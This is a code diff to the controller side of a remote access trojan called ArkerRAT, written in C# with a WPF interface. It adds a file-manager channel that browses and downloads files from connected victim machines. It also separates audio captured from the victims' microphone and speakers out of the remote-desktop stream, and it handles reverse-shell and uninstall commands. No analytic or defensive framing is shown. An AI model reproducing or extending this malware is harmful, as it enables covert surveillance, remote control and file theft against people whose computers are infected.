@@ -17,8 +17,9 @@ using ArkerRatWpfVersion;
 using System.Windows.Markup;
 using System.Xml.Linq;
 using System.Collections.Concurrent;
+//using static System.Windows.Forms.VisualStyles.VisualStyleElement;
 
-namespace ArkerRAT1
+namespace ArkerRatWpfVersion
 {
     public class RATHostSession
     {
@@ -90,6 +91,8 @@ namespace ArkerRAT1
                             await Task.Run(() => SortData("§PingStart§", "§PingEnd§"));
                             await Task.Run(() => SortData("§RemoteDesktopStart§", "§RemoteDesktopEnd§"));
                             await Task.Run(() => SortData("§ReverseShellStart§", "§ReverseShellEnd§"));
+                            await Task.Run(() => SortData("§FileManagerStart§", "§FileManagerEnd§"));
+
 
 
                             stringBuilder.Clear();
@@ -132,7 +135,48 @@ namespace ArkerRAT1
                         else if (startDelimiter == "§RemoteDesktopStart§" && remoteDesktopWindowIsAlreadyOpen == true)
                         {
                             //Assing data to remotedesktop class.
-                            remoteDesktopWindow.frameQue.Enqueue(subString);                       
+                            if (subString.Contains("§OA§") && remoteDesktopWindow.cAOVOn)
+                            {
+                                //Sort out the audio data
+                                subString = subString.Replace("§OA§", string.Empty);
+                                remoteDesktopWindow.clientAudioQue.Enqueue(subString);
+                            }
+                            else if (subString.Contains("§IA§") && remoteDesktopWindow.cAIVOn)
+                            {
+                                subString = subString.Replace("§IA§", string.Empty);
+
+                                remoteDesktopWindow.clientAudioQue.Enqueue(subString);
+                            }
+                            else
+                            {
+                                remoteDesktopWindow.frameQue.Enqueue(subString);
+                            }
+                        }
+                        else if(startDelimiter == "§FileManagerStart§")
+                        {
+                            if (subString.Contains("§UF§"))
+                            {
+                                subString = subString.Replace("§UF§", string.Empty);
+
+                                if (subString.Contains("§start§") && !fileManagerWindow.download)
+                                {
+                                    subString= subString.Replace("§start§", string.Empty);
+                                    Task.Run(() => fileManagerWindow.StartDownloadingFile(subString));
+                                }
+                                else if (subString == "§end§")
+                                {
+                                    fileManagerWindow.download = false;
+                                    fileManagerWindow.dataBuffer = new ConcurrentQueue<string>();
+                                }
+                                else
+                                {
+                                    fileManagerWindow.dataBuffer.Enqueue(subString);
+                                }
+                            }
+                            else
+                            {
+                                fileManagerWindow.GenerateFileSystem(subString);
+                            }
                         }
                         else if (startDelimiter == "§PingStart§")
                         {
@@ -195,20 +239,7 @@ namespace ArkerRAT1
                 
             });
         }
-        public void RemoveThisClientUI()
-        {
-            Task.Run(() =>
-            {
-                ArkerRATServerMechanics.rATClients.Remove(this);
-                source.Cancel();
-                clientStream.Close();
-                client.Close();
-                if (reverseShellWindow != null)
-                {
-                    reverseShellWindow.Close();
-                }
-            }); 
-        }
+       
         public async void Disconnect(object sender, EventArgs e)
         {
             RemoveThisClientUI();
@@ -221,6 +252,54 @@ namespace ArkerRAT1
             RemoveThisClientUI();
             await SendData("§UninstallStart§§UninstallEnd§");
 
+        }
+
+        public async void RemoveThisClientUI()
+        {
+           await Task.Run(() =>
+            {
+
+                ArkerRATServerMechanics.rATClients.Remove(this);
+                source.Cancel();
+                clientStream.Close();
+                client.Close();
+
+
+
+                CloseAllTheWindows();
+
+            });
+        }
+        //______________________________________________________________
+        //WINDOWS
+        private void CloseAllTheWindows()
+        {
+            try
+            {
+                reverseShellWindow.Dispatcher.BeginInvoke(new Action(() =>
+                {
+                    reverseShellWindow.CloseWindow(null, null);
+                }));
+            }
+            catch (Exception ex) { }
+
+            try
+            {
+                remoteDesktopWindow.Dispatcher.BeginInvoke(new Action(() =>
+                {
+                    remoteDesktopWindow.CloseWindow(null, null);
+                }));
+            }
+            catch (Exception ex) { }
+
+            try
+            {
+                fileManagerWindow.Dispatcher.BeginInvoke(new Action(() =>
+                {
+                    fileManagerWindow.CloseWindow(null, null);
+                }));
+            }
+            catch (Exception ex) { }
         }
 
         public ReverseShellWindow reverseShellWindow;
@@ -241,11 +320,26 @@ namespace ArkerRAT1
         {
             if (!remoteDesktopWindowIsAlreadyOpen)
             {
+                data = string.Empty;
                 remoteDesktopWindow = new RemoteDesktopWindow(this);
                 remoteDesktopWindow.WindowState = WindowState.Normal;
                 remoteDesktopWindow.Activate();
                 remoteDesktopWindow.Show();
             }
         }
+
+        public File_Manager fileManagerWindow;
+        public bool fileManagerWindowIsAlreadyOpen = false;
+        public void StartFileManager(object sender, EventArgs e)
+        {
+            if (!fileManagerWindowIsAlreadyOpen)
+            {
+                fileManagerWindow = new File_Manager(this);
+                fileManagerWindow.WindowState = WindowState.Normal;
+                fileManagerWindow.Activate();
+                fileManagerWindow.Show();
+            }
+        }
+        //____________________________________________________________
     }
 }
